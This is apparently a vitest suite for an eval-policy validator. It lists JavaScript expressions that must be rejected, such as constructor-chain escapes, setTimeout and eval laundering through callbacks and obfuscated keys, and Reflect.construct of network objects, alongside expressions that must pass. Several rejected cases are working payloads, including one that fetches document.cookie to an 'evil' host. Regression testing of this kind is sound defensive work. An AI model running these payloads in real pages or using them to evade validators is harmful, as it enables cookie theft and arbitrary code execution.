/**
 * Adversarial matrix for the beta.11 P1-1 / P1-2 eval-policy bypasses.
 *
 * P1-1: the AST validator only inspected the OUTERMOST member property, so
 * `('').constructor.constructor('return 1')` slipped through (arbitrary code
 * execution in the page). P1-2: `Reflect.construct` was never rejected, so the
 * network constructors removed from WRITE_APIS (product decision) could be
 * built anyway.
 *
 * Every case is labelled with its acceptance criterion so the auditor can grep
 * AC1/AC2/AC3 straight out of the test names.
 */
import { describe, expect, it } from 'vitest'
import { validateEvalExpression } from '../src/eval-policy.ts'
import { BrowserError } from '../src/errors.ts'

/** Assert that an expression is rejected with a BrowserError code 'eval-policy'. */
function expectEvalPolicyError(expression: string): void {
  let thrown: unknown
  try { validateEvalExpression(expression) } catch (e) { thrown = e }
  expect(thrown, `expected eval-policy rejection for: ${expression}`).toBeInstanceOf(BrowserError)
  expect((thrown as BrowserError).code).toBe('eval-policy')
}

describe('AC1: P1-1 constructor-chain code execution is rejected', () => {
  it.each([
    [`(x=>x).constructor('return 1').call(null)`, 'arrow value .constructor + call'],
    [`('')['constructor']?.['constructor']('return 1').call(null)`, 'string literal + optional chain'],
    [`Reflect.construct(('').constructor, ['return 1'])`, 'Reflect.construct of a constructor'],
    [`('').constructor.constructor('return document.cookie').call(null)`, 'cookie read payload'],
    [`('').constructor.constructor('return fetch("https://evil/?d="+document.cookie)').call(null)`, 'cookie exfil payload'],
    [`({}).__proto__.constructor.constructor('return 1')()`, '__proto__ chain'],
    [`('').constructor.constructor.apply(null, ['return 1'])`, 'apply trampoline'],
    [`('').constructor.constructor.bind(null)('return 1')()`, 'bind trampoline'],
    [`''['con'+'structor']('return 1')`, 'computed-string obfuscation'],
    [`Object.getOwnPropertyDescriptor((()=>{}), 'constructor').value('return 1')`, 'descriptor .value route'],
    [`Object.getOwnPropertyDescriptor((()=>{}), 'con'+'structor').value('return 1')`, 'descriptor + obfuscation'],
    [`(f => f('alert(1)'))(setTimeout)`, 'arrow-parameter alias laundering'],
    [`(e => e('return 1'))(window['eval'])`, 'arrow alias of eval member'],
  ])('AC1 rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })
})

describe('AC2: P1-2 Reflect.construct network construction is rejected', () => {
  it.each([
    [`Reflect.construct(window['WebSocket'], ['wss://evil'])`, 'WebSocket'],
    [`Reflect.construct(window['XMLHttpRequest'], [])`, 'XMLHttpRequest'],
    [`Reflect.construct(window['EventSource'], ['https://evil'])`, 'EventSource'],
    [`Reflect['construct'](window['WebSocket'], ['wss://evil'])`, 'computed member'],
    [`Reflect?.construct(window['WebSocket'], ['wss://evil'])`, 'optional chain'],
    [`(R => R.construct(window['WebSocket'], ['wss://evil']))(Reflect)`, 'arrow alias of Reflect'],
  ])('AC2 rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })
})

describe('AC3: legit reads and network calls stay allowed', () => {
  it.each([
    // network (beta.11 product decision — must NOT regress)
    `fetch('https://example.com')`,
    `fetch('https://example.com', { method: 'POST', body: 'x' })`,
    `navigator.sendBeacon('https://example.com', 'x')`,
    `fetch('https://example.com').then(r => r.text())`,
    `window.postMessage('x', '*')`,
    `fetch('https://example.com/?c=' + document.cookie)`,
    // reads
    `1 + 1`,
    `window.__NEXT_DATA__`,
    `readText('#a')`,
    `localStorage.getItem('t')`,
    `data[key]`,
    `window['__NEXT_DATA__']`,
    `window?.__NEXT_DATA__`,
    `[1,2,3].map(n => n * 2)`,
    `JSON.parse('{}')`,
    `'abc'.toUpperCase()`,
    `document.querySelector('#a').textContent`,
    `window.location.href`,
    `performance.now()`,
    `Date.now()`,
    `Math.max(1, 2)`,
    `(x => x * 2)(21)`,
    `Reflect.has(window, 'WebSocket')`,
    `Reflect.ownKeys({})`,
    `Object.getPrototypeOf({})`,
    `fetch('u').then(r => r.headers.get('x'))`,
  ])('AC3 accepts %s', (expression) => {
    expect(() => validateEvalExpression(expression)).not.toThrow()
  })
})

/**
 * Fix round 2 (FIX-1/FIX-2/FIX-3/FIX-4). The first matrix only covered the
 * *identifier* binding form and the *member-chain* value form, so the same
 * "launder a dangerous function into a harmless name" semantic survived
 * through three other channels:
 *   - FIX-1: destructuring / default / rest parameter patterns
 *   - FIX-2: dangerous values passed as call arguments or object property values
 *   - FIX-4: member chains broken by a dynamic computed key
 * FIX-3 repairs the over-rejection the first attempt introduced (a param name
 * collected from an unrelated arrow scope).
 */
describe('AC1b: FIX-1 binding-form laundering is rejected (destructuring / default / rest)', () => {
  it.each([
    [`(({constructor: c}) => c('return 1'))((x=>x))`, 'ObjectPattern rename of constructor'],
    [`(({constructor: c}) => (({constructor: F}) => [0].map(F('PWNED="yes"')))(c))('')`, 'nested double destructuring (RCE chain)'],
    [`(([f]) => f('alert(1)'))([setTimeout])`, 'ArrayPattern of a dangerous array element'],
    [`((f = setTimeout) => f('1'))()`, 'AssignmentPattern default value'],
    [`((...f) => f('alert(1)'))(setTimeout)`, 'RestElement parameter'],
    [`(({'constructor': c}) => c('return document.cookie'))('')`, 'string-literal pattern key'],
    [`(({['constructor']: c}) => c('return 1'))('')`, 'computed template/literal pattern key'],
    [`(({a: {constructor: c}}) => c('return 1'))({a: (x=>x)})`, 'nested ObjectPattern'],
    [`(({constructor: c = (x=>x)}) => c('return 1'))({})`, 'AssignmentPattern inside ObjectPattern'],
    [`(([f = setTimeout]) => f('1'))([])`, 'AssignmentPattern inside ArrayPattern'],
    [`(({constructor: c}) => [0].map(c('return 1')))('')`, 'destructured alias as a map argument'],
    [`(({constructor: c}) => c('return 1'))(Object.getPrototypeOf((x=>x)))`, 'getPrototypeOf source + destructuring (PLAN AC5 gap)'],
    [`Object.getPrototypeOf('').constructor.constructor('return 1')()`, 'getPrototypeOf chain (PLAN AC5 gap)'],
  ])('AC1b rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })
})

describe('AC2b: FIX-2 value-position laundering is rejected (callback args / property values)', () => {
  it.each([
    [`['x'].map(setTimeout)`, 'dangerous function as a callback argument'],
    [`[1].forEach(alert)`, 'alert as a callback argument'],
    [`['fetch("https://evil")'].map(setTimeout)`, 'dangerous function executes a payload string'],
    [`[1].map(alert)`, 'map callback laundering'],
    [`Promise.resolve('x').then(setTimeout)`, 'promise continuation laundering'],
    [`({f: setTimeout}).f('1')`, 'object property value laundering'],
    [`({f: alert}).f('pwned')`, 'object property value alert'],
    [`({f: Reflect.get(window, 'open')}).f('https://evil')`, 'reflective getter laundering'],
    [`['x'].filter(setTimeout)`, 'filter callback laundering'],
    [`[setTimeout].map(f => f('alert(1)'))`, 'dangerous array element reaching a callback param'],
    [`[1].map((0, alert))`, 'sequence expression in an argument'],
    [`[1].map([setTimeout][0])`, 'array element as a callback'],
    [`[1].map(({a: setTimeout}).a)`, 'object property as a callback'],
    [`[1].map(((f) => f)(setTimeout))`, 'IIFE-wrapped callback'],
    [`[1].map(x => setTimeout).at(0)('alert(1)')`, 'arrow returning a dangerous value, then called'],
    [`[1].map(x => setTimeout).forEach(f => f('alert(1)'))`, 'arrow return smuggled into an alias call'],
    [`({a: {b: setTimeout}}).a.b('1')`, 'nested object property value'],
    [`[[setTimeout]][0].map(f => f('1'))`, 'nested array element'],
    [`(({a: [c]}) => c('return 1'))({a: [(x=>x)]})`, 'nested pattern binding from an aggregate'],
  ])('AC2b rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })
})

describe('AC4: FIX-4 dynamic computed member keys no longer truncate the chain', () => {
  it.each([
    [`('')[` + '`constructor`' + `]('return 1')`, 'template-literal computed key'],
    [`('')['con'+'structor']('return 1')`, 'string-concatenation computed key'],
    [`('')['con'+'structor']['con'+'structor']('return 1')`, 'full concatenated chain'],
    [`[0].map(({f: ('')['con'+'structor']['con'+'structor']}).f('PWNED="yes"'))`, 'dynamic key + property value (independent RCE primitive)'],
  ])('AC4 rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })
})

/**
 * Fix round 3 (NEW-P0). FIX-4 constant folding was wired into `propertyKeyName()`
 * and the `Reflect.get` branch only, NOT into `memberName()` — the single name
 * resolution entry used by the WRITE_APIS check and the member-chain walk. So
 * the same member chain passed or failed depending only on HOW the key was
 * spelled: `[1].map(window['eval'])` was rejected while
 * `[1].map(window['ev'+'al'])` (value/callback position) was accepted, giving
 * `eval` as a forEach/map callback → arbitrary code execution in the page.
 * These cases MUST fail on the pre-fix code (recorded: 11 ACCEPT / 0 REJECT).
 */
describe('AC4b: NEW-P0 folded computed keys in VALUE position are rejected', () => {
  it.each([
    [`[1].map(window['ev'+'al'])`, 'concatenated key as a callback (eval)'],
    [`["payload"].forEach(window['ev'+'al'])`, 'concatenated key as forEach callback (eval)'],
    [`["alert(1)"].map(window['ev'+'al'])`, 'eval executes an attacker string'],
    [`["fetch(\\"https://evil\\")"].map(window['ev'+'al'])`, 'eval + network egress payload'],
    [`[1].map(window['e'+'v'+'al'])`, 'three-part concatenation'],
    [`[1].map(window['op'+'en'])`, 'folded WRITE_APIS member (open)'],
    [`[1].map(document['wri'+'te'])`, 'folded document.write'],
    [`['k'].forEach(localStorage['set'+'Item'])`, 'folded localStorage.setItem'],
    [`['https://evil'].forEach(location['ass'+'ign'])`, 'folded location.assign'],
    [`[1].map(("")['con'+'structor']['con'+'structor'])`, 'folded constructor chain as a callback'],
    [`[1].map(window['con'+'structor']['con'+'structor'])`, 'folded window.constructor chain'],
    [`[1].map(window?.['ev'+'al'])`, 'optional chain + folded key'],
    [`[1].map((0, window['ev'+'al']))`, 'sequence expression + folded key'],
    [`[1].map([window['ev'+'al']][0])`, 'array element + folded key'],
    ['[1].map(window[`ev${"a"}l`])', 'template-literal key'],
    ['[1].map(("")[`con${"s"}tructor`][`con${"s"}tructor`])', 'template-literal constructor chain'],
  ])('AC4b rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })
})

describe('AC3d: FIX-4b regression — folded/harmless computed keys still allowed', () => {
  it.each([
    `window['__NEXT'+'_DATA__']`,
    `data[key]`,
    `window[key]`,
    `document['querySel'+'ector']('#a')`,
    `fetch('u', { body: data[key] })`,
    `[1,2].map(n => data[n])`,
    `[1,2].map(n => window['__NEXT'+'_DATA__'])`,
  ])('AC3d accepts %s', (expression) => {
    expect(() => validateEvalExpression(expression)).not.toThrow()
  })
})

/**
 * D-2 (fix round 3): the property-name blacklist is base-agnostic (DECIDED D6),
 * so idioms that REUSE a blacklisted property name are rejected as collateral.
 * Design doc §4.5.1 registers the nine classes; these tests make the claim
 * machine-checked in both directions: the registered classes must stay
 * rejected (a change to ACCEPT means the blacklist was weakened = security
 * regression), and the listed alternatives must stay allowed (a change to
 * REJECT means over-rejection).
 */
describe('D-2: registered collateral rejections (property-name reuse)', () => {
  it.each([
    [`Object.prototype.hasOwnProperty.call({}, 'x')`, '1: call trampoline'],
    [`Array.prototype.slice.call([1,2])`, '2: call trampoline'],
    [`''.constructor.name`, '3: constructor chain'],
    [`[].constructor`, '4: constructor chain'],
    [`[1,2].constructor`, '4: constructor chain (non-empty array)'],
    [`fn.apply(null, [1])`, '5: apply trampoline'],
    [`fn.bind(null)`, '5: bind trampoline'],
    [`Object.getOwnPropertyDescriptor({}, 'x')`, '6: descriptor .value reaches Function'],
    [`x?.constructor`, '7: optional chain does not exempt'],
    [`Object.prototype.toString.call({})`, '8: prototype + call'],
    [`Object.prototype.hasOwnProperty`, '8: prototype'],
    [`({}).__proto__`, '9: __proto__'],
  ])('D-2 rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })

  it.each([
    `Object.keys({})`,
    `Array.isArray([])`,
    `Object.getPrototypeOf({})`,
    `JSON.parse('{}')`,
    `[1,2].slice(1)`,
    `Object.freeze({})`,
    `x instanceof Object`,
    `typeof x`,
    `data[key]`,
    `window['__NEXT'+'_DATA__']`,
  ])('D-2 keeps the documented alternative allowed: %s', (expression) => {
    expect(() => validateEvalExpression(expression)).not.toThrow()
  })
})

describe('D-1: shared child-walk refactor keeps every composite value covered', () => {
  it.each([
    [`[1].map(true ? setTimeout : null)`, 'conditional consequent'],
    [`[1].map(false ? null : alert)`, 'conditional alternate'],
    [`[1].map(1 ? setTimeout : 2)`, 'conditional with literal test'],
    [`({f: true ? setTimeout : null}).f('1')`, 'conditional inside a property value'],
    [`({f: true && setTimeout}).f('1')`, 'logical AND'],
    [`({f: setTimeout || null}).f('1')`, 'logical OR'],
    [`[1].map((0, setTimeout))`, 'sequence'],
    [`[1].map([setTimeout][0])`, 'array element'],
    [`[1].map(!setTimeout ? 1 : 2)`, 'unary inside a conditional test'],
  ])('D-1 rejects %s (%s)', (expression) => {
    expectEvalPolicyError(expression)
  })

  it.each([
    `[1].map(true ? (x=>x) : null)`,
    `[1].map(true ? 1 : 2)`,
    `({f: true ? 'a' : 'b'}).f`,
  ])('D-1 accepts %s', (expression) => {
    expect(() => validateEvalExpression(expression)).not.toThrow()
  })
})

describe('AC3b: FIX-3 scoped bindings — legit callback/alias calls stay allowed (regression)', () => {
  it.each([
    `[() => 1].map(f => f())`,
    `[1].map(f => f + 1) + f()`,
    `((fn) => fn(2))((x) => x + 1)`,
    `[1,2].map((x, i) => x + i)`,
    `Object.keys(o).map(k => o[k])`,
    `[() => 1].map((f, i) => f() + i)`,
  ])('AC3b accepts %s', (expression) => {
    expect(() => validateEvalExpression(expression)).not.toThrow()
  })
})

describe('AC3c: FIX-1/FIX-2 regression — legit reads are not over-rejected', () => {
  it.each([
    `data[key]`,
    `fetch('u', { method: 'POST', body: 'x' })`,
    `fetch('u', { body: data[key] })`,
    `Object.entries(window.__NEXT_DATA__).map(([k, v]) => k)`,
    `[...document.querySelectorAll('a')].map(a => a.href)`,
    `({a: 1, b: 'x'}).a`,
    `[1, 2, 3].filter(n => n > 1).map(n => n * 2)`,
    `localStorage.getItem('t')`,
    `headers.get('x')`,
    `Array.from(document.querySelectorAll('a')).length`,
  ])('AC3c accepts %s', (expression) => {
    expect(() => validateEvalExpression(expression)).not.toThrow()
  })
})
